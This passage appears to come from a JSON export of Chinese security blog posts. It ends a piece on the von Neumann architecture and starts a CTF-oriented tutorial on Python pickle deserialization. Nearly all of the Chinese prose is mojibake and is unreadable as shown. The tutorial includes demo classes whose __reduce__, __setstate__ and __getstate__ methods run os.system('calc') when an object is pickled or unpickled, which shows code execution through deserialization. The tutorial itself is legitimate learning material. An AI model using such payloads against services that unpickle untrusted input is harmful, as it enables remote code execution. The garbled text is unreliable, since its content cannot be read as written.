‡é”®ç›˜æ˜¯è¾“å…¥è®¾å¤‡ï¼Œæ˜¾ç¤ºå™¨æ˜¯è¾“å‡ºè®¾å¤‡ã€‚æˆ‘ä»¬ç”¨çš„æ™ºèƒ½æ‰‹æœºï¼Œè§¦æ‘¸å±æ—¢æ˜¯è¾“å…¥è®¾å¤‡ï¼Œåˆæ˜¯è¾“å‡ºè®¾å¤‡ã€‚è€Œè·‘åœ¨å„ç§äº‘ä¸Šçš„æœåŠ¡å™¨ï¼Œåˆ™æ˜¯é€šè¿‡ç½‘ç»œæ¥è¿›è¡Œè¾“å…¥å’Œè¾“å‡ºã€‚è¿™ä¸ªæ—¶å€™ï¼Œç½‘å¡æ—¢æ˜¯è¾“å…¥è®¾å¤‡åˆæ˜¯è¾“å‡ºè®¾å¤‡ã€‚ ä»»ä½•ä¸€å°è®¡ç®—æœºçš„ä»»ä½•ä¸€ä¸ªéƒ¨ä»¶éƒ½å¯ä»¥å½’åˆ°è¿ç®—å™¨ã€æ§åˆ¶å™¨ã€å­˜å‚¨å™¨ã€è¾“å…¥è®¾å¤‡å’Œè¾“å‡ºè®¾å¤‡ä¸­ï¼Œè€Œæ‰€æœ‰çš„ç°ä»£è®¡ç®—æœºä¹Ÿéƒ½æ˜¯åŸºäºè¿™ä¸ªåŸºç¡€æ¶æ„æ¥è®¾è®¡å¼€å‘çš„ã€‚ è€Œæ‰€æœ‰çš„è®¡ç®—æœºç¨‹åºï¼Œä¹Ÿéƒ½å¯ä»¥æŠ½è±¡ä¸ºä»è¾“å…¥è®¾å¤‡è¯»å–è¾“å…¥ä¿¡æ¯ï¼Œé€šè¿‡è¿ç®—å™¨å’Œæ§åˆ¶å™¨æ¥æ‰§è¡Œå­˜å‚¨åœ¨å­˜å‚¨å™¨é‡Œçš„ç¨‹åºï¼Œæœ€ç»ˆæŠŠç»“æœè¾“å‡ºåˆ°è¾“å‡ºè®¾å¤‡ä¸­ã€‚è€Œæˆ‘ä»¬æ‰€æœ‰æ’°å†™çš„æ— è®ºé«˜çº§è¿˜æ˜¯ä½çº§è¯­è¨€çš„ç¨‹åºï¼Œä¹Ÿéƒ½æ˜¯åŸºäºè¿™æ ·ä¸€ä¸ªæŠ½è±¡æ¡†æ¶æ¥è¿›è¡Œè¿ä½œçš„ã€‚ å†¯Â·è¯ºä¾æ›¼ä½“ç³»ç»“æ„ç¤ºæ„å›¾ï¼Œå›¾ç‰‡æ¥æº å†¯Â·è¯ºä¾æ›¼æ¶æ„ï¼ˆVon Neumann Architectureï¼‰ æ˜¯å†¯Â·è¯ºä¾æ›¼å’Œå…¶ä»–äººæå‡ºçš„ç”µå­è®¡ç®—æœºé€šç”¨æ¶æ„ã€‚å†¯Â·è¯ºä¾æ›¼æ¶æ„å°†é€šç”¨è®¡ç®—æœºå®šä¹‰ä¸ºä»¥ä¸‹ 3 ä¸ªåŸºæœ¬åŸåˆ™ï¼š 1ã€é‡‡ç”¨äºŒè¿›åˆ¶ï¼š æŒ‡ä»¤å’Œæ•°æ®å‡é‡‡ç”¨äºŒè¿›åˆ¶æ ¼å¼ï¼› 2ã€å­˜å‚¨ç¨‹åºï¼š ä¸€ä¸ªè®¡ç®—æœºç¨‹åºï¼Œä¸å¯èƒ½åªæœ‰ä¸€æ¡æŒ‡ä»¤ï¼Œè€Œæ˜¯ç”±æˆåƒä¸Šä¸‡æ¡æŒ‡ä»¤ç»„æˆçš„ã€‚æŒ‡ä»¤å’Œæ•°æ®å‡å­˜å‚¨åœ¨å­˜å‚¨å™¨ä¸­ï¼Œè€Œä¸æ˜¯æ—©æœŸçš„æ’çº¿æ¿ä¸­ï¼Œè®¡ç®—æœºæŒ‰éœ€ä»å­˜å‚¨å™¨ä¸­å–æŒ‡ä»¤å’Œå–æ•°æ®ï¼› 3ã€è®¡ç®—æœºç”± 5 ä¸ªç¡¬ä»¶ç»„æˆï¼š è¿ç®—å™¨ã€æ§åˆ¶å™¨ã€å­˜å‚¨å™¨ã€è¾“å…¥è®¾å¤‡å’Œè¾“å‡ºè®¾å¤‡ã€‚åœ¨æœ€å¼€å§‹çš„è®¡ç®—æœºä¸­ï¼Œäº”ä¸ªéƒ¨ä»¶æ˜¯å›´ç»•ç€è¿ç®—å™¨è¿è½¬çš„ï¼Œè¿™ä½¿å¾—å­˜å‚¨å™¨å’Œ I/O è®¾å¤‡ä¹‹é—´çš„æ•°æ®ä¼ é€ä¹Ÿéœ€è¦ç»è¿‡è¿ç®—å™¨ã€‚ è€Œç°ä»£è®¡ç®—æœºä¸­ï¼Œäº”ä¸ªéƒ¨ä»¶æ˜¯å›´ç»•ç€å­˜å‚¨å™¨è¿è½¬çš„ï¼Œè¿™ä½¿å¾—å­˜å‚¨å™¨å’Œ I/O è®¾å¤‡å¯ä»¥ç›´æ¥å®Œæˆæ•°æ®ä¼ é€ï¼Œè€Œä¸éœ€è¦ç»è¿‡ CPUã€‚ åœ¨å†¯Â·è¯ºä¾æ›¼æ¶æ„ä¹‹å‰è¿˜æœ‰ä¸€ä¸ªå“ˆä½›æ¶æ„ï¼Œç°åœ¨è¯´çš„æ¯”è¾ƒå°‘ã€‚ä¸¤è€…çš„åŒºåˆ«åœ¨äºå†¯Â·è¯ºä¾æ›¼æ˜¯å°†æŒ‡ä»¤å’Œæ•°æ®å­˜å‚¨åœ¨åŒä¸€ä¸ªå­˜å‚¨å™¨çš„ä¸åŒä½ç½®ï¼Œå­˜åœ¨äº‰ç”¨é—®é¢˜ï¼›è€Œå“ˆå¼—æ¶æ„å°†æŒ‡ä»¤å’Œæ•°æ®å­˜å‚¨åœ¨ä¸åŒå­˜å‚¨å™¨ä¸­ï¼Œè§„é¿äº†äº‰ç”¨é—®é¢˜ï¼Œä¸ CPU L1 ç¼“å­˜å°†æŒ‡ä»¤å’Œæ•°æ®åˆ†ç¦»çš„æ€æƒ³ç±»ä¼¼ã€‚ 12.2 å†¯Â·è¯ºä¾æ›¼ç“¶é¢ˆ å†¯Â·è¯ºä¾æ›¼ç“¶é¢ˆçš„æ¦‚å¿µæœ€æ—©ç”± John Backus åœ¨ 1977 å¹´çš„å›¾çµå¥–é¢†å¥–æ¼”è®²ä¸­æå‡ºï¼š ç”±äº CPU å’Œå­˜å‚¨å™¨ä¹‹é—´å…±äº«åŒä¸€ä¸ªç³»ç»Ÿæ€»çº¿ï¼Œå¹¶ä¸” CPU å’Œå­˜å‚¨å™¨ä¹‹é—´å­˜åœ¨å·¨å¤§çš„é€Ÿåº¦å·®ï¼Œå¯¼è‡´ CPU éœ€è¦ä¸æ–­åœ°è¢«è¿«ç­‰å¾…æ•°æ®è¯»å–æˆ–å†™å…¥åˆ°å­˜å‚¨å™¨ï¼Œå› æ­¤éåˆ¶äº† CPU çš„ååé‡ è¦ä»æ ¹æœ¬ä¸Šè§£å†³å†¯Â·è¯ºä¾æ›¼ç“¶é¢ˆï¼Œè¿˜æ˜¯åªèƒ½é‡æ–°æ„å»ºä¸€å¥—æ–°çš„è®¡ç®—æœºä½“ç³»ï¼Œä¾‹å¦‚ç”Ÿç‰©è®¡ç®—æœºã€é‡å­è®¡ç®—æœºã€‚ä¸è¿‡ï¼Œç›®å‰å®ƒä»¬éƒ½è¿˜å¤„åœ¨éå¸¸åŸå§‹çš„é˜¶æ®µã€‚ç°ä»£è®¡ç®—æœºä½“ç³»åªèƒ½é‡‡ç”¨ä¼˜åŒ–ç­–ç•¥æ¥å‡å¼±å†¯Â·è¯ºä¾æ›¼ç“¶é¢ˆçš„å½±å“ã€‚ 12.3 æ€»ç»“ å¦‚æœè¯´å›¾çµæœºæè¿°çš„æ˜¯è®¡ç®—æœºçš„æŠ½è±¡æ¨¡å‹ï¼Œé‚£ä¹ˆå†¯Â·è¯ºä¾æ›¼æ¶æ„åˆ™æ˜¯å¯¹å›¾çµæœºè¿™ä¸ªæŠ½è±¡æ¨¡å‹çš„å®ç°æ¶æ„ã€‚ å†¯è¯ºä¾æ›¼æ¶æ„ç¡®ç«‹äº†ç°ä»£ç”µå­è®¡ç®—æœºçš„åŸºç¡€å’Œç»“æ„ï¼Œå­¦ä¹ è®¡ç®—æœºç»„æˆåŸç†ï¼Œå…¶å®å°±æ˜¯å­¦ä¹ å’Œæ‹†è§£å†¯è¯ºä¾æ›¼æ¶æ„ã€‚ 0x12 å‚è€ƒæ–‡ç«  å­—é•¿ä¸ç«¯åº å­—èŠ‚åºæ¢æï¼šå¤§ç«¯ä¸å°ç«¯çš„æ¯”è¾ƒ æ±‡ç¼–æŒ‡ä»¤å…¥é—¨çº§æ•´ç† æ±‡ç¼–è¯­è¨€å…¥é—¨æ•™ç¨‹ æ±‡ç¼–åŸºç¡€ä¹‹ä¸‰ â€“ æ±‡ç¼–æŒ‡ä»¤ 01 å†¯Â·è¯ºä¾æ›¼ä½“ç³»ç»“æ„ï¼šè®¡ç®—æœºç»„æˆçš„é‡‘å­—å¡” ä¸€å¥—ç”¨äº† 70 å¹´çš„è®¡ç®—æœºæ¶æ„ â€”â€” å†¯Â·è¯ºä¾æ›¼æ¶æ„","tags":["reverseç³»åˆ—"],"categories":["reverse"]},{"title":"Pickleååºåˆ—åŒ–","path":"/2023/11/14/pickle-fan-xu-lie-hua-xue-xi/","content":"0x01 å‰è¨€ ä¹‹å‰å­¦çš„ååºåˆ—åŒ–ä¸€ç›´æ˜¯å›´ç»•PHPçš„ï¼Œè¿‘æœŸåˆ·é¢˜ä¹Ÿé‡åˆ°pickleååºåˆ—åŒ–ï¼Œæ•…æ­¤å­¦ä¹ ä¸€ç•ªï¼Œå”‰ï¼ŒPythonååºåˆ—åŒ–éƒ½éš¾ï¼Œæ›´åˆ«è¯´Javaäº†â”­â”®ï¹â”­â”® 0x02 ç®€ä»‹ Pythonçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯å°†ä¸€ä¸ªç±»å¯¹è±¡å‘å­—èŠ‚æµè½¬åŒ–ä»è€Œè¿›è¡Œå­˜å‚¨å’Œä¼ è¾“, ç„¶åä½¿ç”¨çš„æ—¶å€™å†å°†å­—èŠ‚æµè½¬åŒ–å›åŸå§‹çš„å¯¹è±¡çš„ä¸€ä¸ªè¿‡ç¨‹, è¿™ä¸ªå’Œå…¶ä»–è¯­è¨€çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–å…¶å®éƒ½å·®ä¸å¤š. Pythonä¸­åºåˆ—åŒ–ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼: pickleæ¨¡å—å’Œjsonæ¨¡å—, å‰è€…æ˜¯Pythonç‰¹æœ‰çš„æ ¼å¼, åè€…æ˜¯jsoné€šç”¨çš„æ ¼å¼. ç›¸è¾ƒäºPHPååºåˆ—åŒ–çµæ´»å¤šæ ·çš„åˆ©ç”¨æ–¹å¼, ä¾‹å¦‚POPé“¾æ„é€ , Pharååºåˆ—åŒ–, åŸç”Ÿç±»ååºåˆ—åŒ–ä»¥åŠå­—ç¬¦é€ƒé€¸ç­‰. Pythonç›¸å¯¹è€Œè¨€æ²¡æœ‰PHPé‚£ä¹ˆçµæ´», å…³äºååºåˆ—åŒ–æ¼æ´ä¸»è¦æ¶‰åŠè¿™ä¹ˆå‡ ä¸ªæ¦‚å¿µ: pickle, pvm, __reduce__é­”æœ¯æ–¹æ³•ã€‚ 0x03 Pickle 3.1 åŸºç¡€çŸ¥è¯† Pickleå¯ä»¥ç”¨äºPythonç‰¹æœ‰çš„ç±»å‹å’ŒPythonçš„æ•°æ®ç±»å‹é—´è¿›è¡Œè½¬æ¢(æ‰€æœ‰Pythonæ•°æ®ç±»å‹). Pythonæä¾›ä¸¤ä¸ªæ¨¡å—æ¥å®ç°åºåˆ—åŒ–: cPickleå’Œpickle. è¿™ä¸¤ä¸ªæ¨¡å—åŠŸèƒ½æ˜¯ä¸€æ ·çš„, åŒºåˆ«åœ¨äºcPickleæ˜¯Cè¯­è¨€å†™çš„, é€Ÿåº¦å¿«; pickleæ˜¯çº¯Pythonå†™çš„, é€Ÿåº¦æ…¢. åœ¨Python3ä¸­å·²ç»æ²¡æœ‰cPickleæ¨¡å—. pickleæœ‰å¦‚ä¸‹å››ç§æ“ä½œæ–¹æ³•: å‡½æ•° è¯´æ˜ dump å¯¹è±¡åºåˆ—åŒ–åˆ°æ–‡ä»¶å¯¹è±¡å¹¶å­˜å…¥æ–‡ä»¶ dumps å¯¹è±¡åºåˆ—åŒ–ä¸º bytes å¯¹è±¡ï¼ˆå­—ç¬¦ä¸²æ ¼å¼çš„å­—èŠ‚æµï¼‰ load å¯¹è±¡ååºåˆ—åŒ–å¹¶ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ® loads ä» bytes å¯¹è±¡ï¼ˆå­—ç¬¦ä¸²æ ¼å¼çš„å­—èŠ‚æµï¼‰ååºåˆ—åŒ– pickle.dump(*obj*, *file*, *protocol=None*, ***, *fix_imports=True*) å°†æ‰“åŒ…å¥½çš„å¯¹è±¡ obj å†™å…¥æ–‡ä»¶ä¸­ï¼Œå…¶ä¸­protocolä¸ºpicklingçš„åè®®ç‰ˆæœ¬ï¼ˆä¸‹åŒï¼‰ã€‚ pickle.dumps(*obj*, *protocol=None*, ***, *fix_imports=True*) å°† obj æ‰“åŒ…ä»¥åçš„å¯¹è±¡ä½œä¸ºbytesç±»å‹ç›´æ¥è¿”å›ã€‚ pickle.load(*file*, ***, *fix_imports=True*, *encoding=\"ASCII\"*, *errors=\"strict\"*) ä»æ–‡ä»¶ä¸­è¯»å–äºŒè¿›åˆ¶å­—èŠ‚æµï¼Œå°†å…¶ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡å¹¶è¿”å›ã€‚ pickle.loads(*data*, ***, *fix_imports=True*, *encoding=\"ASCII\"*, *errors=\"strict\"*) ä»dataä¸­è¯»å–äºŒè¿›åˆ¶å­—èŠ‚æµï¼Œå°†å…¶ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡å¹¶è¿”å›ã€‚ object.__reduce__() __reduce__()å…¶å®æ˜¯objectç±»ä¸­çš„ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é‡å†™ç±»çš„ object.__reduce__() å‡½æ•°ï¼Œä½¿ä¹‹åœ¨è¢«å®ä¾‹åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œã€‚ Pythonè¦æ±‚è¯¥æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…å…ƒç»„ã€‚å¦‚æœè¿”å›å…ƒç»„(callable, ([para1,para2...])[,...]) ï¼Œé‚£ä¹ˆæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ï¼Œå‚æ•°ä¸ºpara1ã€para2... è¿™é‡Œåœ¨å¼ºè°ƒä¸€ä¸‹è¿™ä¸ªåŸºç¡€çŸ¥è¯†ï¼š ä¸PHPç±»ä¼¼ï¼Œpythonä¹Ÿæœ‰åºåˆ—åŒ–åŠŸèƒ½ä»¥é•¿æœŸå‚¨å­˜å†…å­˜ä¸­çš„æ•°æ®ã€‚pickleæ˜¯pythonä¸‹çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åŒ…ã€‚ pythonæœ‰å¦ä¸€ä¸ªæ›´åŸå§‹çš„åºåˆ—åŒ–åŒ…marshalï¼Œç°åœ¨å¼€å‘æ—¶ä¸€èˆ¬ä½¿ç”¨pickleã€‚ ä¸jsonç›¸æ¯”ï¼Œpickleä»¥äºŒè¿›åˆ¶å‚¨å­˜ï¼Œä¸æ˜“äººå·¥é˜…è¯»ï¼›jsonå¯ä»¥è·¨è¯­è¨€ï¼Œè€Œpickleæ˜¯Pythonä¸“ç”¨çš„ï¼›pickleèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œjsonåªèƒ½è¡¨ç¤ºä¸€éƒ¨åˆ†å†…ç½®ç±»å‹ä¸”ä¸èƒ½è¡¨ç¤ºè‡ªå®šä¹‰ç±»å‹ã€‚ pickleå®é™…ä¸Šå¯ä»¥çœ‹ä½œä¸€ç§ç‹¬ç«‹çš„è¯­è¨€ï¼Œé€šè¿‡å¯¹opcodeçš„æ›´æ”¹ç¼–å†™å¯ä»¥æ‰§è¡Œpythonä»£ç ã€è¦†ç›–å˜é‡ç­‰æ“ä½œã€‚ç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œæœ‰çš„ä»£ç ä¸èƒ½é€šè¿‡pickleåºåˆ—åŒ–å¾—åˆ°ï¼ˆpickleè§£æèƒ½åŠ›å¤§äºpickleç”Ÿæˆèƒ½åŠ›ï¼‰ã€‚ 3.2 å¯åºåˆ—åŒ–çš„å¯¹è±¡ None ã€ True å’Œ False æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•° strã€byteã€bytearray åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰ å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•° å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±» __dict__ å±æ€§å€¼æˆ– __getstate__() å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ï¼ˆè¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instancesï¼‰ 3.3 object.__reduce__() å‡½æ•° åœ¨å¼€å‘æ—¶ï¼Œå¯ä»¥é€šè¿‡é‡å†™ç±»çš„ object.__reduce__() å‡½æ•°ï¼Œä½¿ä¹‹åœ¨è¢«å®ä¾‹åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œã€‚å…·ä½“è€Œè¨€ï¼Œpythonè¦æ±‚ object.__reduce__() è¿”å›ä¸€ä¸ª (callable, ([para1,para2...])[,...]) çš„å…ƒç»„ï¼Œæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«unpickleæ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ä»¥ç”Ÿæˆå¯¹è±¡ï¼ˆè¯¥callableå…¶å®æ˜¯æ„é€ å‡½æ•°ï¼‰ã€‚ åœ¨ä¸‹æ–‡pickleçš„opcodeä¸­ï¼Œ R çš„ä½œç”¨ä¸ object.__reduce__() å…³ç³»å¯†åˆ‡ï¼šé€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°ã€‚å…¶å® R æ­£å¥½å¯¹åº” object.__reduce__() å‡½æ•°ï¼Œ object.__reduce__() çš„è¿”å›å€¼ä¼šä½œä¸º R çš„ä½œç”¨å¯¹è±¡ï¼Œå½“åŒ…å«è¯¥å‡½æ•°çš„å¯¹è±¡è¢«pickleåºåˆ—åŒ–æ—¶ï¼Œå¾—åˆ°çš„å­—ç¬¦ä¸²æ˜¯åŒ…å«äº† R çš„ã€‚ 3.4 é­”æœ¯æ–¹æ³• __reduce__() ååºåˆ—åŒ–æ—¶è°ƒç”¨ __reduce_ex__() ååºåˆ—åŒ–æ—¶è°ƒç”¨ //ä¸Šé¢çš„å‡çº§ç‰ˆ __setstate__() ååºåˆ—åŒ–æ—¶è°ƒç”¨ __getstate__() åºåˆ—åŒ–æ—¶è°ƒç”¨ è¿™é‡Œç”¨ä¸€ä¸ªå°è¿ªçš„Demoæ¥ä½“ä¼šä¸€ä¸‹ä¸Šè¿°é­”æœ¯æ–¹æ³•çš„ä½œç”¨ __reduce__() import pickle import os #ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•è°ƒç”¨-__reduce__() __reduce_ex__() __setstate__() class A(object): def __reduce__(self): print('ååºåˆ—åŒ–è°ƒç”¨') return (os.system,('calc',)) a = A() p_a = pickle.dumps(a) pickle.loads(p_a) print('==========') print(p_a) ä¸Šè¿°å…ˆå®ä¾‹åŒ–ä¸€ä¸ªaå¯¹è±¡ï¼Œæ¥ç€å¯¹aå¯¹è±¡è¿›è¡Œdumpsåºåˆ—åŒ–ï¼Œç„¶åloadså¯¹aåºåˆ—åŒ–åçš„å­—èŠ‚æµæ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åæ‰“å°å‡ºaåºåˆ—åŒ–åçš„å­—èŠ‚æµæ•°æ®ã€‚ æ³¨æ„è¿™é‡Œçš„__reduce__é­”æœ¯æ–¹æ³•åœ¨ååºåˆ—åŒ–æ—¶ï¼ˆä¹Ÿå°±æ˜¯è°ƒç”¨loadså‡½æ•°æ—¶ï¼‰ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œéšåæ‰“å°ä¸€æ®µå­—ç¬¦ï¼Œæ¥ç€è°ƒç”¨systemæ‰§è¡Œcalcå‘½ä»¤ï¼Œç»“æœå¦‚ä¸‹å›¾ã€‚ æˆ‘ä»¬å°†ä¸Šè¿°loadsæ³¨é‡Šæ‰ï¼Œä¼šå‘ç°æ²¡æœ‰è°ƒç”¨è®¡ç®—å™¨ï¼Œä½†å´æ‰§è¡Œäº†reduceä¸­çš„printå‡½æ•°ï¼Œè¿™é‡Œæˆ‘å°±æ‡µé€¼äº†ï¼Œä¸æ˜¯è¯´åªæœ‰loadsååºåˆ—åŒ–æ—¶æ‰ä¼šè°ƒç”¨reduceæ–¹æ³•å—ã€‚æ¥ç€é—®äº†ä¸€ä¸‹GPTå‘ç°ï¼š åœ¨è¿›è¡Œpickle.dumpsæ—¶ï¼Œä¼šå°è¯•è°ƒç”¨reduceæ–¹æ³•ä»¥è·å–åºåˆ—åŒ–ä¿¡æ¯ï¼Œå› æ­¤ä¼šæ‰§è¡Œprintå‡½æ•°ã€‚ä½†åœ¨æ­¤é˜¶æ®µï¼Œå…¶å¹¶ä¸ä¼šæ‰§è¡Œè¿”å›çš„å¯è°ƒç”¨å¯¹è±¡å’Œå…¶ä»–å‚æ•°ï¼Œåªæ˜¯å•çº¯çš„è·å–è¿™äº›ä¿¡æ¯ç”¨äºåç»­çš„ååºåˆ—åŒ–æ“ä½œã€‚ è¿™é‡Œæœ‰ä¸€ä¸ªæ³¨æ„ç‚¹ï¼Œå°±æ˜¯reduceçš„returnéƒ¨åˆ†ï¼Œæ˜¯å¿…é¡»è¦è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…æ˜¯å…ƒç»„çš„ï¼Œå¦åˆ™å°±ä¼šæŠ¥é”™ï¼Œå¦‚ä¸‹å›¾ ä¸è¿‡ä¸€ä¸ªæ‡µé€¼çš„ç‚¹æ˜¯ï¼Œæˆ‘å°†ä¸Šè¿°os.systemåé¢çš„é€—å·å»æ‰ä¹‹åï¼Œè™½ç„¶æŠ¥é”™ï¼Œä½†ä¾æ—§æ‰§è¡Œäº†calcå‘½ä»¤ã€‚ã€‚ã€‚æš‚ä¸æ¸…æ¥šåŸå› ã€‚ __setstate__() import pickle import os class SerializePerson(): # æ„é€ å‡½æ•°çš„å®šä¹‰ def __init__(self, name): self.name = name # æ„é€  __setstate__ æ–¹æ³• def __setstate__(self, name): os.system('calc') # æ¶æ„ä»£ç  tmp = pickle.dumps(SerializePerson('tom')) #åºåˆ—åŒ– pickle.loads(tmp) # ååºåˆ—åŒ– æ­¤æ—¶ä¼šå¼¹å‡ºè®¡ç®—å™¨ è¿™é‡Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨__setstate__é­”æœ¯æ–¹æ³•ï¼Œè¿›è€Œæ‰§è¡Œcalcå‘½ä»¤ï¼Œå¦‚ä¸‹å›¾æˆåŠŸéªŒè¯ï¼Œä½†æ­¤å‡½æ•°çš„ä¼˜å…ˆçº§ä½äºreduceï¼Œä¸”æ˜¯é™æ€æ–¹æ³•ã€‚ __getstate__() import pickle import os #åºåˆ—åŒ–é­”æœ¯æ–¹æ³•è°ƒç”¨-__getstate__ class A(object): def __getstate__(self): print('åºåˆ—åŒ–è°ƒç”¨') os.system('calc') a = A() p_a = pickle.dumps(a) print('==========') print(p_a) è¯¥å‡½æ•°ä¼šåœ¨åºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œå¦‚ä¸‹å›¾æˆåŠŸéªŒè¯ 3.5 ç®€å•ä½¿ç”¨ 3.5.1 åºåˆ—åŒ–æ“ä½œ ä»£ç ï¼š import pickle class Demo(): def init(self, name='h3rmesk1t'): self.name = name print(pickle.dumps(Demo())) åœ¨Python2ä¸Python3ä¸‹çš„è¿è¡Œç»“æœå¦‚ä¸Šå›¾æ‰€ç¤º è¾“å‡ºçš„ä¸€å¤§ä¸²å­—ç¬¦å®é™…ä¸Šæ˜¯ä¸€ä¸²PVMæ“ä½œç ï¼Œå¯ä»¥åœ¨pickle.pyä¸­çœ‹åˆ°å…³äºè¿™äº›æ“ä½œç çš„è¯¦è§£. 3.5.2 ååºåˆ—åŒ–æ“ä½œ import pickle class Demo(): def __init__(self, name='h3rmesk1t'): self.name = name print('[+] åºåˆ—åŒ–') print(pickle.dumps(Demo())) print('[+] ååºåˆ—åŒ–') print(pickle.loads(pickle.dumps(Demo())).name) 0x04 Pickleè¿‡ç¨‹è¯¦ç»†è§£è¯» pickleè§£æä¾é Pickle Virtual Machine (PVM)è¿›è¡Œã€‚ PVMæ¶‰åŠåˆ°ä¸‰ä¸ªéƒ¨åˆ†ï¼š1. è§£æå¼•æ“ 2. æ ˆ 3. å†…å­˜ï¼š è§£æå¼•æ“ï¼šä»æµä¸­è¯»å– opcode å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° . åœæ­¢ã€‚æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚ æ ˆï¼šç”±Pythonçš„listå®ç°ï¼Œè¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚ memoï¼šç”±Pythonçš„dictå®ç°ï¼Œä¸ºPVMçš„ç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨ã€‚è¯´äººè¯ï¼šå°†ååºåˆ—åŒ–å®Œæˆçš„æ•°æ®ä»¥ key-value çš„å½¢å¼å‚¨å­˜åœ¨memoä¸­ï¼Œä»¥ä¾¿åæ¥ä½¿ç”¨ã€‚ ä¸ºäº†ä¾¿äºç†è§£ï¼Œhachp1å¸ˆå‚…æŠŠBHè®²ç¨¿ä¸­çš„ç›¸å…³éƒ¨åˆ†åˆ¶æˆäº†åŠ¨å›¾ï¼ŒPVMè§£æ str çš„è¿‡ç¨‹åŠ¨å›¾ï¼š PVMè§£æ __reduce__() çš„è¿‡ç¨‹åŠ¨å›¾ï¼š 4.1 æ‰§è¡Œæµç¨‹ é¦–å…ˆ, PVMä¼šæŠŠæºä»£ç ç¼–è¯‘æˆå­—èŠ‚ç , å­—èŠ‚ç æ˜¯Pythonè¯­è¨€ç‰¹æœ‰çš„ä¸€ç§è¡¨ç°å½¢å¼, å®ƒä¸æ˜¯äºŒè¿›åˆ¶æœºå™¨ç , éœ€è¦è¿›ä¸€æ­¥ç¼–è¯‘æ‰èƒ½è¢«æœºå™¨æ‰§è¡Œ. å¦‚æœPythonè¿›ç¨‹åœ¨ä¸»æœºä¸Šæœ‰å†™å…¥æƒé™, é‚£ä¹ˆå®ƒä¼šæŠŠç¨‹åºå­—èŠ‚ç ä¿å­˜ä¸ºä¸€ä¸ªä»¥.pycä¸ºæ‰©å±•åçš„æ–‡ä»¶. å¦‚æœæ²¡æœ‰å†™å…¥æƒé™, åˆ™Pythonè¿›ç¨‹ä¼šåœ¨å†…å­˜ä¸­ç”Ÿæˆå­—èŠ‚ç , åœ¨ç¨‹åºæ‰§è¡Œç»“æŸåè¢«è‡ªåŠ¨ä¸¢å¼ƒ. ä¸€èˆ¬æ¥è¯´, åœ¨æ„å»ºç¨‹åºæ—¶æœ€å¥½ç»™Pythonè¿›ç¨‹åœ¨ä¸»æœºä¸Šçš„å†™å…¥æƒé™, è¿™æ ·åªè¦æºä»£ç æ²¡æœ‰æ”¹å˜, ç”Ÿæˆçš„.pycæ–‡ä»¶å°±å¯ä»¥è¢«é‡å¤åˆ©ç”¨, æé«˜æ‰§è¡Œæ•ˆç‡, åŒæ—¶éšè—æºä»£ç . ç„¶å, Pythonè¿›ç¨‹ä¼šæŠŠç¼–è¯‘å¥½çš„å­—èŠ‚ç è½¬å‘åˆ°PVM(Pythonè™šæ‹Ÿæœº)ä¸­, PVMä¼šå¾ªç¯è¿­ä»£æ‰§è¡Œå­—èŠ‚ç æŒ‡ä»¤, 